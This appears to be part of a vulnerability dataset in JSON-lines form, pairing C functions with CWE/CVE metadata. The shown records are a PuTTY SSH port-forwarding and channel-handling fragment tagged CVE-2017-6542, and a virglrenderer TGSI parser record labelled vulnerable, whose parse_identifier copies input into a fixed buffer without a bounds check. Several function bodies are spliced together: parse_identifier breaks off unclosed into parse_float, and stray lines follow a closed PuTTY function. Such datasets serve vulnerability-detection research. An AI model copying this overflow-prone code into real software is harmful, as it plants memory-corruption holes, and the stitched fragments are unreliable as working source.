? epf->saddr : \"\",\n\t\t\t\t  epf->saddr ? \":\" : \"\",\n\t\t\t\t  epf->sserv ? epf->sserv : \"\",\n\t\t\t\t  epf->sserv ? \"(\" : \"\",\n\t\t\t\t  epf->sport,\n\t\t\t\t  epf->sserv ? \")\" : \"\");\n\t    if (epf->type == 'D') {\n\t\tdportdesc = NULL;\n\t    } else {\n\t\tdportdesc = dupprintf(\"%s:%s%s%d%s\",\n\t\t\t\t      epf->daddr,\n\t\t\t\t      epf->dserv ? epf->dserv : \"\",\n\t\t\t\t      epf->dserv ? \"(\" : \"\",\n\t\t\t\t      epf->dport,\n\t\t\t\t      epf->dserv ? \")\" : \"\");\n\t    }\n\n\t    if (epf->type == 'L') {\n                char *err = pfl_listen(epf->daddr, epf->dport,\n                                       epf->saddr, epf->sport,\n                                       ssh, conf, &epf->local,\n                                       epf->addressfamily);\n\n\t\tlogeventf(ssh, \"Local %sport %s forwarding to %s%s%s\",\n\t\t\t  epf->addressfamily == ADDRTYPE_IPV4 ? \"IPv4 \" :\n\t\t\t  epf->addressfamily == ADDRTYPE_IPV6 ? \"IPv6 \" : \"\",\n\t\t\t  sportdesc, dportdesc,\n\t\t\t  err ? \" failed: \" : \"\", err ? err : \"\");\n                if (err)\n                    sfree(err);\n\t    } else if (epf->type == 'D') {\n\t\tchar *err = pfl_listen(NULL, -1, epf->saddr, epf->sport,\n                                       ssh, conf, &epf->local,\n                                       epf->addressfamily);\n\n\t\tlogeventf(ssh, \"Local %sport %s SOCKS dynamic forwarding%s%s\",\n\t\t\t  epf->addressfamily == ADDRTYPE_IPV4 ? \"IPv4 \" :\n\t\t\t  epf->addressfamily == ADDRTYPE_IPV6 ? \"IPv6 \" : \"\",\n\t\t\t  sportdesc,\n\t\t\t  err ? \" failed: \" : \"\", err ? err : \"\");\n\n                if (err)\n                    sfree(err);\n\t    } else {\n\t\tstruct ssh_rportfwd *pf;\n\n\t\t/*\n\t\t * Ensure the remote port forwardings tree exists.\n\t\t */\n\t\tif (!ssh->rportfwds) {\n\t\t    if (ssh->version == 1)\n\t\t\tssh->rportfwds = newtree234(ssh_rportcmp_ssh1);\n\t\t    else\n\t\t\tssh->rportfwds = newtree234(ssh_rportcmp_ssh2);\n\t\t}\n\n\t\tpf = snew(struct ssh_rportfwd);\n                pf->share_ctx = NULL;\n                pf->dhost = dupstr(epf->daddr);\n\t\tpf->dport = epf->dport;\n                if (epf->saddr) {\n                    pf->shost = dupstr(epf->saddr);\n                } else if (conf_get_int(conf, CONF_rport_acceptall)) {\n                    pf->shost = dupstr(\"\");\n                } else {\n                    pf->shost = dupstr(\"localhost\");\n                }\n\t\tpf->sport = epf->sport;\n\t\tif (add234(ssh->rportfwds, pf) != pf) {\n\t\t    logeventf(ssh, \"Duplicate remote port forwarding to %s:%d\",\n\t\t\t      epf->daddr, epf->dport);\n\t\t    sfree(pf);\n\t\t} else {\n\t\t    logeventf(ssh, \"Requesting remote port %s\"\n\t\t\t      \" forward to %s\", sportdesc, dportdesc);\n\n\t\t    pf->sportdesc = sportdesc;\n\t\t    sportdesc = NULL;\n\t\t    epf->remote = pf;\n\t\t    pf->pfrec = epf;\n\n\t\t    if (ssh->version == 1) {\n\t\t\tsend_packet(ssh, SSH1_CMSG_PORT_FORWARD_REQUEST,\n\t\t\t\t    PKT_INT, epf->sport,\n\t\t\t\t    PKT_STR, epf->daddr,\n\t\t\t\t    PKT_INT, epf->dport,\n\t\t\t\t    PKT_END);\n\t\t\tssh_queue_handler(ssh, SSH1_SMSG_SUCCESS,\n\t\t\t\t\t  SSH1_SMSG_FAILURE,\n\t\t\t\t\t  ssh_rportfwd_succfail, pf);\n\t\t    } else {\n\t\t\tstruct Packet *pktout;\n\t\t\tpktout = ssh2_pkt_init(SSH2_MSG_GLOBAL_REQUEST);\n\t\t\tssh2_pkt_addstring(pktout, \"tcpip-forward\");\n\t\t\tssh2_pkt_addbool(pktout, 1);/* want reply */\n\t\t\tssh2_pkt_addstring(pktout, pf->shost);\n\t\t\tssh2_pkt_adduint32(pktout, pf->sport);\n\t\t\tssh2_pkt_send(ssh, pktout);\n\n\t\t\tssh_queue_handler(ssh, SSH2_MSG_REQUEST_SUCCESS,\n\t\t\t\t\t  SSH2_MSG_REQUEST_FAILURE,\n\t\t\t\t\t  ssh_rportfwd_succfail, pf);\n\t\t    }\n\t\t}\n\t    }\n\t    sfree(sportdesc);\n\t    sfree(dportdesc);\n\t}\n}\n\nstatic void ssh1_smsg_stdout_stderr_data(Ssh ssh, struct Packet *pktin)\n{\n    char *string;\n    int stringlen, bufsize;\n\n    ssh_pkt_getstring(pktin, &string, &stringlen);\n    if (string == NULL) {\n\tbombout((\"Incoming terminal data packet was badly formed\"));\n\treturn;\n    }\n\n    bufsize = from_backend(ssh->frontend, pktin->type == SSH1_SMSG_STDERR_DATA,\n\t\t\t   string, stringlen);\n    if (!ssh->v1_stdout_throttling && bufsize > SSH1_BUFFER_LIMIT) {\n\tssh->v1_stdout_throttling = 1;\n\tssh_throttle_conn(ssh, +1);\n    }\n}\n\nstatic void ssh1_smsg_x11_open(Ssh ssh, struct Packet *pktin)\n{\n    /* Remote side is trying to open a channel to talk to our\n     * X-Server. Give them back a local channel number. */\n    struct ssh_channel *c;\n    int remoteid = ssh_pkt_getuint32(pktin);\n\n    logevent(\"Received X11 connect request\");\n    /* Refuse if X11 forwarding is disabled. */\n    if (!ssh->X11_fwd_enabled) {\n\tsend_packet(ssh, SSH1_MSG_CHANNEL_OPEN_FAILURE,\n\t\t    PKT_INT, remoteid, PKT_END);\n\tlogevent(\"Rejected X11 connect request\");\n    } else {\n\tc = snew(struct ssh_channel);\n\tc->ssh = ssh;\n\n\tssh_channel_init(c);\n\tc->u.x11.xconn = x11_init(ssh->x11authtree, c, NULL, -1);\n        c->remoteid = remoteid;\n        c->halfopen = FALSE;\n        c->type = CHAN_X11;\t/* identify channel type */\n        send_packet(ssh, SSH1_MSG_CHANNEL_OPEN_CONFIRMATION,\n                    PKT_INT, c->remoteid, PKT_INT,\n                    c->localid, PKT_END);\n        logevent(\"Opened X11 forward channel\");\n    }\n}\n\nstatic void ssh1_smsg_agent_open(Ssh ssh, struct Packet *pktin)\n{\n    /* Remote side is trying to open a channel to talk to our\n     * agent. Give them back a local channel number. */\n    struct ssh_channel *c;\n    int remoteid = ssh_pkt_getuint32(pktin);\n\n    /* Refuse if agent forwarding is disabled. */\n    if (!ssh->agentfwd_enabled) {\n\tsend_packet(ssh, SSH1_MSG_CHANNEL_OPEN_FAILURE,\n\t\t    PKT_INT, remoteid, PKT_END);\n    } else {\n\tc = snew(struct ssh_channel);\n\tc->ssh = ssh;\n\tssh_channel_init(c);\n\tc->remoteid = remoteid;\n\tc->halfopen = FALSE;\n\tc->type = CHAN_AGENT;\t/* identify channel type */\n\tc->u.a.lensofar = 0;\n\tc->u.a.message = NULL;\n\tc->u.a.pending = NULL;\n\tc->u.a.outstanding_requests = 0;\n\tsend_packet(ssh, SSH1_MSG_CHANNEL_OPEN_CONFIRMATION,\n\t\t    PKT_INT, c->remoteid, PKT_INT, c->localid,\n\t\t    PKT_END);\n    }\n}\n\nstatic void ssh1_msg_port_open(Ssh ssh, struct Packet *pktin)\n{\n    /* Remote side is trying to open a channel to talk to a\n     * forwarded port. Give them back a local channel number. */\n    struct ssh_rportfwd pf, *pfp;\n    int remoteid;\n    int hostsize, port;\n    char *host;\n    char *err;\n\n    remoteid = ssh_pkt_getuint32(pktin);\n    ssh_pkt_getstring(pktin, &host, &hostsize);\n    port = ssh_pkt_getuint32(pktin);\n\n    pf.dhost = dupprintf(\"%.*s\", hostsize, NULLTOEMPTY(host));\n    pf.dport = port;\n    pfp = find234(ssh->rportfwds, &pf, NULL);\n\n    if (pfp == NULL) {\n\tlogeventf(ssh, \"Rejected remote port open request for %s:%d\",\n\t\t  pf.dhost, port);\n\tsend_packet(ssh, SSH1_MSG_CHANNEL_OPEN_FAILURE,\n\t\t    PKT_INT, remoteid, PKT_END);\n    } else {\n        struct ssh_channel *c = snew(struct ssh_channel);\n        c->ssh = ssh;\n\n\tlogeventf(ssh, \"Received remote port open request for %s:%d\",\n\t\t  pf.dhost, port);\n\terr = pfd_connect(&c->u.pfd.pf, pf.dhost, port,\n                          c, ssh->conf, pfp->pfrec->addressfamily);\n\tif (err != NULL) {\n\t    logeventf(ssh, \"Port open failed: %s\", err);\n            sfree(err);\n\t    sfree(c);\n\t    send_packet(ssh, SSH1_MSG_CHANNEL_OPEN_FAILURE,\n\t\t\tPKT_INT, remoteid, PKT_END);\n\t} else {\n\t    ssh_channel_init(c);\n\t    c->remoteid = remoteid;\n\t    c->halfopen = FALSE;\n\t    c->type = CHAN_SOCKDATA;\t/* identify channel type */\n\t    send_packet(ssh, SSH1_MSG_CHANNEL_OPEN_CONFIRMATION,\n\t\t\tPKT_INT, c->remoteid, PKT_INT,\n\t\t\tc->localid, PKT_END);\n\t    logevent(\"Forwarded port opened successfully\");\n\t}\n    }\n\n    sfree(pf.dhost);\n}\n\nstatic void ssh1_msg_channel_open_confirmation(Ssh ssh, struct Packet *pktin)\n{\n    struct ssh_channel *c;\n\n    c = ssh_channel_msg(ssh, pktin);\n    if (c && c->type == CHAN_SOCKDATA) {\n\tc->remoteid = ssh_pkt_getuint32(pktin);\n\tc->halfopen = FALSE;\n\tc->throttling_conn = 0;\n\tpfd_confirm(c->u.pfd.pf);\n    }\n\n    if (c && c->pending_eof) {\n\t/*\n\t * We have a pending close on this channel,\n\t * which we decided on before the server acked\n\t * the channel open. So now we know the\n\t * remoteid, we can close it again.\n\t */\n        ssh_channel_try_eof(c);\n    }\n}\n\n        c->remoteid = remoteid;\n        c->halfopen = FALSE;\n        c->type = CHAN_AGENT;   /* identify channel type */\n       c->u.a.lensofar = 0;\n       c->u.a.message = NULL;\n        c->u.a.pending = NULL;\n       c->u.a.outstanding_requests = 0;\n        send_packet(ssh, SSH1_MSG_CHANNEL_OPEN_CONFIRMATION,\n                    PKT_INT, c->remoteid, PKT_INT, c->localid,\n                    PKT_END);\n\tdel234(ssh->channels, c);\n\tsfree(c);\n    }\n}\n", "func_hash": 325909590182680995779527787302149618683, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2017-6542", "cve_desc": "The ssh_agent_channel_data function in PuTTY before 0.68 allows remote attackers to have unspecified impact via a large length value in an agent protocol message and leveraging the ability to connect to the Unix-domain socket representing the forwarded agent connection, which trigger a buffer overflow.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2017-6542"}
{"idx": 241, "project": "virglrenderer", "commit_id": "e534b51ca3c3cd25f3990589932a9ed711c59b27", "project_url": "https://gitlab.freedesktop.org/virgl/virglrenderer", "commit_url": "https://cgit.freedesktop.org/virglrenderer/commit/?id=e534b51ca3c3cd25f3990589932a9ed711c59b27", "commit_message": "gallium/tgsi: fix overflow in parse property\n\nIn parse_identifier, it doesn't stop copying '*pcur'\nuntill encounter the NULL. As the 'ret' has a\nfixed-size buffer, if the '*pcur' has a long string,\nthere will be a buffer overflow. This patch avoid this.\n\nSigned-off-by: Li Qiang <liq3ea@gmail.com>\nReviewed-by: Marc-Andr\u00e9 Lureau <marcandre.lureau@redhat.com>\nSigned-off-by: Dave Airlie <airlied@redhat.com>", "target": 1, "func": "static boolean parse_identifier( const char **pcur, char *ret )\n {\n    const char *cur = *pcur;\n    int i = 0;\n    if (is_alpha_underscore( cur )) {\n       ret[i++] = *cur++;\n      while (is_alpha_underscore( cur ) || is_digit( cur ))\n          ret[i++] = *cur++;\n       ret[i++] = '\\0';\n       *pcur = cur;\n       return TRUE;\n\n/* Parse floating point.\n */\nstatic boolean parse_float( const char **pcur, float *val )\n{\n   const char *cur = *pcur;\n   boolean integral_part = FALSE;\n   boolean fractional_part = FALSE;\n\n   if (*cur == '0' && *(cur + 1) == 'x') {\n      union fi fi;\n      fi.ui = strtoul(cur, NULL, 16);\n      *val = fi.f;\n      cur += 10;\n      goto out;\n   }\n\n   *val = (float) atof( cur );\n   if (*cur == '-' || *cur == '+')\n      cur++;\n   if (is_digit( cur )) {\n      cur++;\n      integral_part = TRUE;\n      while (is_digit( cur ))\n         cur++;\n   }\n   if (*cur == '.') {\n      cur++;\n      if (is_digit( cur )) {\n         cur++;\n         fractional_part = TRUE;\n         while (is_digit( cur ))\n            cur++;\n      }\n   }\n   if (!integral_part && !fractional_part)\n      return FALSE;\n   if (uprcase( *cur ) == 'E') {\n      cur++;\n      if (*cur == '-' || *cur == '+')\n         cur++;\n      if (is_digit( cur )) {\n         cur++;\n         while (is_digit( cur ))\n            cur++;\n      }\n      else\n         return FALSE;\n   }\n\nout:\n   *pcur = cur;\n   return TRUE;\n}\n\nstatic boolean parse_double( const char **pcur, uint32_t *val0, uint32_t *val1)\n{\n   const char *cur = *pcur;\n   union {\n      double dval;\n      uint32_t uval[2];\n   } v;\n\n   v.dval = strtod(cur, (char**)pcur);\n   if (*pcur == cur)\n      return FALSE;\n\n   *val0 = v.uval[0];\n   *val1 = v.uval[1];\n\n   return TRUE;\n}\n\nstruct translate_ctx\n{\n   const char *text;\n   const char *cur;\n   struct tgsi_token *tokens;\n   struct tgsi_token *tokens_cur;\n   struct tgsi_token *tokens_end;\n   struct tgsi_header *header;\n   unsigned processor : 4;\n   unsigned implied_array_size : 6;\n   unsigned num_immediates;\n};\n\nstatic void report_error(struct translate_ctx *ctx, const char *format, ...)\n{\n   va_list args;\n   int line = 1;\n   int column = 1;\n   const char *itr = ctx->text;\n\n   debug_printf(\"\\nTGSI asm error: \");\n\n   va_start(args, format);\n   _debug_vprintf(format, args);\n   va_end(args);\n\n   while (itr != ctx->cur) {\n      if (*itr == '\\n') {\n         column = 1;\n         ++line;\n      }\n      ++column;\n      ++itr;\n   }\n\n   debug_printf(\" [%d : %d] \\n\", line, column);\n}\n\n/* Parse shader header.\n * Return TRUE for one of the following headers.\n *    FRAG\n *    GEOM\n *    VERT\n */\nstatic boolean parse_header( struct translate_ctx *ctx )\n{\n   uint processor;\n\n   if (str_match_nocase_whole( &ctx->cur, \"FRAG\" ))\n      processor = TGSI_PROCESSOR_FRAGMENT;\n   else if (str_match_nocase_whole( &ctx->cur, \"VERT\" ))\n      processor = TGSI_PROCESSOR_VERTEX;\n   else if (str_match_nocase_whole( &ctx->cur, \"GEOM\" ))\n      processor = TGSI_PROCESSOR_GEOMETRY;\n   else if (str_match_nocase_whole( &ctx->cur, \"TESS_CTRL\" ))\n      processor = TGSI_PROCESSOR_TESS_CTRL;\n   else if (str_match_nocase_whole( &ctx->cur, \"TESS_EVAL\" ))\n      processor = TGSI_PROCESSOR_TESS_EVAL;\n   else if (str_match_nocase_whole( &ctx->cur, \"COMP\" ))\n      processor = TGSI_PROCESSOR_COMPUTE;\n   else {\n      report_error( ctx, \"Unknown header\" );\n      return FALSE;\n   }\n\n   if (ctx->tokens_cur >= ctx->tokens_end)\n      return FALSE;\n   ctx->header = (struct tgsi_header *) ctx->tokens_cur++;\n   *ctx->header = tgsi_build_header();\n\n   if (ctx->tokens_cur >= ctx->tokens_end)\n      return FALSE;\n   *(struct tgsi_processor *) ctx->tokens_cur++ = tgsi_build_processor( processor, ctx->header );\n   ctx->processor = processor;\n\n   return TRUE;\n}\n\nstatic boolean parse_label( struct translate_ctx *ctx, uint *val )\n{\n   const char *cur = ctx->cur;\n\n   if (parse_uint( &cur, val )) {\n      eat_opt_white( &cur );\n      if (*cur == ':') {\n         cur++;\n         ctx->cur = cur;\n         return TRUE;\n      }\n   }\n   return FALSE;\n}\n\nstatic boolean\nparse_file( const char **pcur, uint *file )\n{\n   uint i;\n\n   for (i = 0; i < TGSI_FILE_COUNT; i++) {\n      const char *cur = *pcur;\n\n      if (str_match_nocase_whole( &cur, tgsi_file_name(i) )) {\n         *pcur = cur;\n         *file = i;\n         return TRUE;\n      }\n   }\n   return FALSE;\n}\n\nstatic boolean\nparse_opt_writemask(\n   struct translate_ctx *ctx,\n   uint *writemask )\n{\n   const char *cur;\n\n   cur = ctx->cur;\n   eat_opt_white( &cur );\n   if (*cur == '.') {\n      cur++;\n      *writemask = TGSI_WRITEMASK_NONE;\n      eat_opt_white( &cur );\n      if (uprcase( *cur ) == 'X') {\n         cur++;\n         *writemask |= TGSI_WRITEMASK_X;\n      }\n      if (uprcase( *cur ) == 'Y') {\n         cur++;\n         *writemask |= TGSI_WRITEMASK_Y;\n      }\n      if (uprcase( *cur ) == 'Z') {\n         cur++;\n         *writemask |= TGSI_WRITEMASK_Z;\n      }\n      if (uprcase( *cur ) == 'W') {\n         cur++;\n         *writemask |= TGSI_WRITEMASK_W;\n      }\n\n      if (*writemask == TGSI_WRITEMASK_NONE) {\n         report_error( ctx, \"Writemask expected\" );\n         return FALSE;\n      }\n\n      ctx->cur = cur;\n   }\n   else {\n      *writemask = TGSI_WRITEMASK_XYZW;\n   }\n   return TRUE;\n}\n\n\n/* <register_file_bracket> ::= <file> `['\n */\nstatic boolean\nparse_register_file_bracket(\n   struct translate_ctx *ctx,\n   uint *file )\n{\n   if (!parse_file( &ctx->cur, file )) {\n      report_error( ctx, \"Unknown register file\" );\n      return FALSE;\n   }\n   eat_opt_white( &ctx->cur );\n   if (*ctx->cur != '[') {\n      report_error( ctx, \"Expected `['\" );\n      return FALSE;\n   }\n   ctx->cur++;\n   return TRUE;\n}\n\n/* <register_file_bracket_index> ::= <register_file_bracket> <uint>\n */\nstatic boolean\nparse_register_file_bracket_index(\n   struct translate_ctx *ctx,\n   uint *file,\n   int *index )\n{\n   uint uindex;\n\n   if (!parse_register_file_bracket( ctx, file ))\n      return FALSE;\n   eat_opt_white( &ctx->cur );\n   if (!parse_uint( &ctx->cur, &uindex )) {\n      report_error( ctx, \"Expected literal unsigned integer\" );\n      return FALSE;\n   }\n   *index = (int) uindex;\n   return TRUE;\n}\n\n/* Parse simple 1d register operand.\n *    <register_dst> ::= <register_file_bracket_index> `]'\n */\nstatic boolean\nparse_register_1d(struct translate_ctx *ctx,\n                  uint *file,\n                  int *index )\n{\n   if (!parse_register_file_bracket_index( ctx, file, index ))\n      return FALSE;\n   eat_opt_white( &ctx->cur );\n   if (*ctx->cur != ']') {\n      report_error( ctx, \"Expected `]'\" );\n      return FALSE;\n   }\n   ctx->cur++;\n   return TRUE;\n}\n\nstruct parsed_bracket {\n   int index;\n\n   uint ind_file;\n   int ind_index;\n   uint ind_comp;\n   uint ind_array;\n};\n\n\nstatic boolean\nparse_register_bracket(\n   struct translate_ctx *ctx,\n   struct parsed_bracket *brackets)\n{\n   const char *cur;\n   uint uindex;\n\n   memset(brackets, 0, sizeof(struct parsed_bracket));\n\n   eat_opt_white( &ctx->cur );\n\n   cur = ctx->cur;\n   if (parse_file( &cur, &brackets->ind_file )) {\n      if (!parse_register_1d( ctx, &brackets->ind_file,\n                              &brackets->ind_index ))\n         return FALSE;\n      eat_opt_white( &ctx->cur );\n\n      if (*ctx->cur == '.') {\n         ctx->cur++;\n         eat_opt_white(&ctx->cur);\n\n         switch (uprcase(*ctx->cur)) {\n         case 'X':\n            brackets->ind_comp = TGSI_SWIZZLE_X;\n            break;\n         case 'Y':\n            brackets->ind_comp = TGSI_SWIZZLE_Y;\n            break;\n         case 'Z':\n            brackets->ind_comp = TGSI_SWIZZLE_Z;\n            break;\n         case 'W':\n            brackets->ind_comp = TGSI_SWIZZLE_W;\n            break;\n         default:\n            report_error(ctx, \"Expected indirect register swizzle component `x', `y', `z' or `w'\");\n            return FALSE;\n         }\n         ctx->cur++;\n         eat_opt_white(&ctx->cur);\n      }\n\n      if (*ctx->cur == '+' || *ctx->cur == '-')\n         parse_int( &ctx->cur, &brackets->index );\n      else\n         brackets->index = 0;\n   }\n   else {\n      if (!parse_uint( &ctx->cur, &uindex )) {\n         report_error( ctx, \"Expected literal unsigned integer\" );\n         return FALSE;\n      }\n      brackets->index = (int) uindex;\n      brackets->ind_file = TGSI_FILE_NULL;\n      brackets->ind_index = 0;\n   }\n   eat_opt_white( &ctx->cur );\n   if (*ctx->cur != ']') {\n      report_error( ctx, \"Expected `]'\" );\n      return FALSE;\n   }\n   ctx->cur++;\n   if (*ctx->cur == '(') {\n      ctx->cur++;\n      eat_opt_white( &ctx->cur );\n      if (!parse_uint( &ctx->cur, &brackets->ind_array )) {\n         report_error( ctx, \"Expected literal unsigned integer\" );\n         return FALSE;\n      }\n      eat_opt_white( &ctx->cur );\n      if (*ctx->cur != ')') {\n         report_error( ctx, \"Expected `)'\" );\n         return FALSE;\n      }\n      ctx->cur++;\n   }\n   return TRUE;\n}\n\nstatic boolean\nparse_opt_register_src_bracket(\n   struct translate_ctx *ctx,\n   struct parsed_bracket *brackets,\n   int *parsed_brackets)\n{\n   const char *cur = ctx->cur;\n\n   *parsed_brackets = 0;\n\n   eat_opt_white( &cur );\n   if (cur[0] == '[') {\n      ++cur;\n      ctx->cur = cur;\n\n      if (!parse_register_bracket(ctx, brackets))\n         return FALSE;\n\n      *parsed_brackets = 1;\n   }\n\n   return TRUE;\n}\n\n\n/* Parse source register operand.\n *    <register_src> ::= <register_file_bracket_index> `]' |\n *                       <register_file_bracket> <register_dst> [`.' (`x' | `y' | `z' | `w')] `]' |\n *                       <register_file_bracket> <register_dst> [`.' (`x' | `y' | `z' | `w')] `+' <uint> `]' |\n *                       <register_file_bracket> <register_dst> [`.' (`x' | `y' | `z' | `w')] `-' <uint> `]'\n */\nstatic boolean\nparse_register_src(\n   struct translate_ctx *ctx,\n   uint *file,\n   struct parsed_bracket *brackets)\n{\n   brackets->ind_comp = TGSI_SWIZZLE_X;\n   if (!parse_register_file_bracket( ctx, file ))\n      return FALSE;\n   if (!parse_register_bracket( ctx, brackets ))\n       return FALSE;\n\n   return TRUE;\n}\n\nstruct parsed_dcl_bracket {\n   uint first;\n   uint last;\n};\n\nstatic boolean\nparse_register_dcl_bracket(\n   struct translate_ctx *ctx,\n   struct parsed_dcl_bracket *bracket)\n{\n   uint uindex;\n   memset(bracket, 0, sizeof(struct parsed_dcl_bracket));\n\n   eat_opt_white( &ctx->cur );\n\n   if (!parse_uint( &ctx->cur, &uindex )) {\n      /* it can be an empty bracket [] which means its range\n       * is from 0 to some implied size */\n      if (ctx->cur[0] == ']' && ctx->implied_array_size != 0) {\n         bracket->first = 0;\n         bracket->last = ctx->implied_array_size - 1;\n         goto cleanup;\n      }\n      report_error( ctx, \"Expected literal unsigned integer\" );\n      return FALSE;\n   }\n   bracket->first = uindex;\n\n   eat_opt_white( &ctx->cur );\n\n   if (ctx->cur[0] == '.' && ctx->cur[1] == '.') {\n      uint uindex;\n\n      ctx->cur += 2;\n      eat_opt_white( &ctx->cur );\n      if (!parse_uint( &ctx->cur, &uindex )) {\n         report_error( ctx, \"Expected literal integer\" );\n         return FALSE;\n      }\n      bracket->last = (int) uindex;\n      eat_opt_white( &ctx->cur );\n   }\n   else {\n      bracket->last = bracket->first;\n   }\n\ncleanup:\n   if (*ctx->cur != ']') {\n      report_error( ctx, \"Expected `]' or `..'\" );\n      return FALSE;\n   }\n   ctx->cur++;\n   return TRUE;\n}\n\n/* Parse register declaration.\n *    <register_dcl> ::= <register_file_bracket_index> `]' |\n *                       <register_file_bracket_index> `..' <index> `]'\n */\nstatic boolean\nparse_register_dcl(\n   struct translate_ctx *ctx,\n   uint *file,\n   struct parsed_dcl_bracket *brackets,\n   int *num_brackets)\n{\n   const char *cur;\n\n   *num_brackets = 0;\n\n   if (!parse_register_file_bracket( ctx, file ))\n      return FALSE;\n   if (!parse_register_dcl_bracket( ctx, &brackets[0] ))\n      return FALSE;\n\n   *num_brackets = 1;\n\n   cur = ctx->cur;\n   eat_opt_white( &cur );\n\n   if (cur[0] == '[') {\n      bool is_in = *file == TGSI_FILE_INPUT;\n      bool is_out = *file == TGSI_FILE_OUTPUT;\n\n      ++cur;\n      ctx->cur = cur;\n      if (!parse_register_dcl_bracket( ctx, &brackets[1] ))\n         return FALSE;\n      /* for geometry shader we don't really care about\n       * the first brackets it's always the size of the\n       * input primitive. so we want to declare just\n       * the index relevant to the semantics which is in\n       * the second bracket */\n\n      /* tessellation has similar constraints to geometry shader */\n      if ((ctx->processor == TGSI_PROCESSOR_GEOMETRY && is_in) ||\n          (ctx->processor == TGSI_PROCESSOR_TESS_EVAL && is_in) ||\n          (ctx->processor == TGSI_PROCESSOR_TESS_CTRL && (is_in || is_out))) {\n         brackets[0] = brackets[1];\n         *num_brackets = 1;\n      } else {\n         *num_brackets = 2;\n      }\n   }\n\n   return TRUE;\n}\n\n\n/* Parse destination register operand.*/\nstatic boolean\nparse_register_dst(\n   struct translate_ctx *ctx,\n   uint *file,\n   struct parsed_bracket *brackets)\n{\n   brackets->ind_comp = TGSI_SWIZZLE_X;\n   if (!parse_register_file_bracket( ctx, file ))\n      return FALSE;\n   if (!parse_register_bracket( ctx, brackets ))\n       return FALSE;\n\n   return TRUE;\n}\n\nstatic boolean\nparse_dst_operand(\n   struct translate_ctx *ctx,\n   struct tgsi_full_dst_register *dst )\n{\n   uint file;\n   uint writemask;\n   const char *cur;\n   struct parsed_bracket bracket[2];\n   int parsed_opt_brackets;\n\n   if (!parse_register_dst( ctx, &file, &bracket[0] ))\n      return FALSE;\n   if (!parse_opt_register_src_bracket(ctx, &bracket[1], &parsed_opt_brackets))\n      return FALSE;\n\n   cur = ctx->cur;\n   eat_opt_white( &cur );\n\n   if (!parse_opt_writemask( ctx, &writemask ))\n      return FALSE;\n\n   dst->Register.File = file;\n   if (parsed_opt_brackets) {\n      dst->Register.Dimension = 1;\n      dst->Dimension.Indirect = 0;\n      dst->Dimension.Dimension = 0;\n      dst->Dimension.Index = bracket[0].index;\n\n      if (bracket[0].ind_file != TGSI_FILE_NULL) {\n         dst->Dimension.Indirect = 1;\n         dst->DimIndirect.File = bracket[0].ind_file;\n         dst->DimIndirect.Index = bracket[0].ind_index;\n         dst->DimIndirect.Swizzle = bracket[0].ind_comp;\n         dst->DimIndirect.ArrayID = bracket[0].ind_array;\n      }\n      bracket[0] = bracket[1];\n   }\n   dst->Register.Index = bracket[0].index;\n   dst->Register.WriteMask = writemask;\n   if (bracket[0].ind_file != TGSI_FILE_NULL) {\n      dst->Register.Indirect = 1;\n      dst->Indirect.File = bracket[0].ind_file;\n      dst->Indirect.Index = bracket[0].ind_index;\n      dst->Indirect.Swizzle = bracket[0].ind_comp;\n      dst->Indirect.ArrayID = bracket[0].ind_array;\n   }\n   return TRUE;\n}\n\nstatic boolean\nparse_optional_swizzle(\n   struct translate_ctx *ctx,\n   uint *swizzle,\n   boolean *parsed_swizzle,\n   int components)\n{\n   const char *cur = ctx->cur;\n\n   *parsed_swizzle = FALSE;\n\n   eat_opt_white( &cur );\n   if (*cur == '.') {\n      uint i;\n\n      cur++;\n      eat_opt_white( &cur );\n      for (i = 0; i < components; i++) {\n         if (uprcase( *cur ) == 'X')\n            swizzle[i] = TGSI_SWIZZLE_X;\n         else if (uprcase( *cur ) == 'Y')\n            swizzle[i] = TGSI_SWIZZLE_Y;\n         else if (uprcase( *cur ) == 'Z')\n            swizzle[i] = TGSI_SWIZZLE_Z;\n         else if (uprcase( *cur ) == 'W')\n            swizzle[i] = TGSI_SWIZZLE_W;\n         else {\n\t    report_error( ctx, \"Expected register swizzle component `x', `y', `z' or `w'\" );\n\t    return FALSE;\n         }\n         cur++;\n      }\n      *parsed_swizzle = TRUE;\n      ctx->cur = cur;\n   }\n   return TRUE;\n}\n\nstatic boolean\nparse_src_operand(\n   struct translate_ctx *ctx,\n   struct tgsi_full_src_register *src )\n{\n   uint file;\n   uint swizzle[4];\n   boolean parsed_swizzle;\n   struct parsed_bracket bracket[2];\n   int parsed_opt_brackets;\n\n   if (*ctx->cur == '-') {\n      ctx->cur++;\n      eat_opt_white( &ctx->cur );\n      src->Register.Negate = 1;\n   }\n\n   if (*ctx->cur == '|') {\n      ctx->cur++;\n      eat_opt_white( &ctx->cur );\n      src->Register.Absolute = 1;\n   }\n\n   if (!parse_register_src(ctx, &file, &bracket[0]))\n      return FALSE;\n   if (!parse_opt_register_src_bracket(ctx, &bracket[1], &parsed_opt_brackets))\n      return FALSE;\n\n   src->Register.File = file;\n   if (parsed_opt_brackets) {\n      src->Register.Dimension = 1;\n      src->Dimension.Indirect = 0;\n      src->Dimension.Dimension = 0;\n      src->Dimension.Index = bracket[0].index;\n      if (bracket[0].ind_file != TGSI_FILE_NULL) {\n         src->Dimension.Indirect = 1;\n         src->DimIndirect.File = bracket[0].ind_file;\n         src->DimIndirect.Index = bracket[0].ind_index;\n         src->DimIndirect.Swizzle = bracket[0].ind_comp;\n         src->DimIndirect.ArrayID = bracket[0].ind_array;\n      }\n      bracket[0] = bracket[1];\n   }\n   src->Register.Index = bracket[0].index;\n   if (bracket[0].ind_file != TGSI_FILE_NULL) {\n      src->Register.Indirect = 1;\n      src->Indirect.File = bracket[0].ind_file;\n      src->Indirect.Index = bracket[0].ind_index;\n      src->Indirect.Swizzle = bracket[0].ind_comp;\n      src->Indirect.ArrayID = bracket[0].ind_array;\n   }\n\n   /* Parse optional swizzle.\n    */\n   if (parse_optional_swizzle( ctx, swizzle, &parsed_swizzle, 4 )) {\n      if (parsed_swizzle) {\n         src->Register.SwizzleX = swizzle[0];\n         src->Register.SwizzleY = swizzle[1];\n         src->Register.SwizzleZ = swizzle[2];\n         src->Register.SwizzleW = swizzle[3];\n      }\n   }\n\n   if (src->Register.Absolute) {\n      eat_opt_white( &ctx->cur );\n      if (*ctx->cur != '|') {\n         report_error( ctx, \"Expected `|'\" );\n         return FALSE;\n      }\n      ctx->cur++;\n   }\n\n\n   return TRUE;\n}\n\nstatic boolean\nparse_texoffset_operand(\n   struct translate_ctx *ctx,\n   struct tgsi_texture_offset *src 